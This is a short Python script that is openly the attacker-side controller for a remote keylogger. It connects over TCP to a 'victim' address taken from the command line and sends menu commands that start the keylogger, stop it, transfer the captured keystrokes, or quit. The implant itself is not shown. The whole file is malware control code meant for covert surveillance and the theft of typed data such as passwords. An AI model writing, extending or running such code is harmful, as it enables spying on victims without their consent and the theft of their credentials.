from socket import socket, AF_INET, SOCK_STREAM
from constants import *
from functions import *
import argparse
from os import system

# Argument Parsing
parser = argparse.ArgumentParser(description = "Program for connecting to victim.")
parser.add_argument("--ip", dest="ip", required=True, type=str)
parser.add_argument("--port", dest="port", required=True, type=int)

args = parser.parse_args()
victim_address = (args.ip, args.port)

sock = socket(AF_INET, SOCK_STREAM)
sock.connect(victim_address)
while True:
    system("clear")
    printMenu()
    try:
        msg = input("Enter a command: ")
        if msg == "1":
            sock.sendall(START_KEYLOGGER.encode("utf-8"))
        elif msg == "2":
            sock.sendall(STOP_KEYLOGGER.encode("utf-8"))
        elif msg == "3":
            sock.sendall(TRANSFER_KEYLOGGER.encode("utf-8"))
        elif msg == "4":
            sock.sendall(QUIT.encode("utf-8"))
            break
        else:
            print("Unrecognized Command!")
    except KeyboardInterrupt:
        break
sock.close()

